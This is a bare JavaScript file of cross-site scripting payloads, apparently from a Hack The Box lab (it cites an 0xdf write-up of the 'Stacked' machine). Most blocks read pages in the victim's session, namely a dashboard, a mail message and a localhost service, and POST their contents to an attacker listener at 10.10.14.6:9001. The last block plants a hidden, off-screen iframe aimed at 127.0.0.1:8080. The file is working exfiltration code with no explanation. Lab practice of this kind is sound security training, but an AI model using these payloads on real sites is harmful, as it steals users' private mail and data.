//
//
var dashboardreq = new XMLHttpRequest();    
dashboardreq.onreadystatechange = function() {              
  if (dashboardreq.readyState == 4) {                       
    var exfilreq = new XMLHttpRequest();                    
    exfilreq.open("POST", "http://10.10.14.6:9001/", false);                                                      
    exfilreq.send(dashboardreq.response);                 
  }     
};    
dashboardreq.open('GET', '/dashboard.php', false);    
dashboardreq.send();  

//
//
var mail1req = new XMLHttpRequest();    
mail1req.onreadystatechange = function() {    
  if (mail1req.readyState == 4) {    
    var exfilreq = new XMLHttpRequest();    
    exfilreq.open("POST", "http://10.10.14.6:9001/", false);    
    exfilreq.send(mail1req.response);    
  }    
};    
mail1req.open('GET', '/read-mail.php?id=1', false);    
mail1req.send();    
//
//

var mail1req = new XMLHttpRequest();    
mail1req.onreadystatechange = function() {    
  if (mail1req.readyState == 4) {    
    var exfilreq = new XMLHttpRequest();    
    exfilreq.open("POST", "http://10.10.14.6:9001/", false);    
    exfilreq.send(mail1req.response);    
  }    
};    
mail1req.open('GET', 'http://localhost:8080/', false);    
mail1req.send();   
//
//


var iframe = document.createElement('iframe');    
iframe.src = 'http://127.0.0.1:8080';    
iframe.onload = function() {    
  setTimeout(function() {    
    iframe.parentNode.removeChild(iframe);    
    }, 5000);    
};    
iframe.sandbox = 'allow-scripts';    
iframe.style.height = '1px';    
iframe.style.width = '1px';    
iframe.style.position = 'fixed';    
iframe.style.top = '-9px';    
iframe.style.left = '-9px';

document.body.appendChild(iframe);    

//
//
// https://0xdf.gitlab.io/2022/03/19/htb-stacked.html
//
//
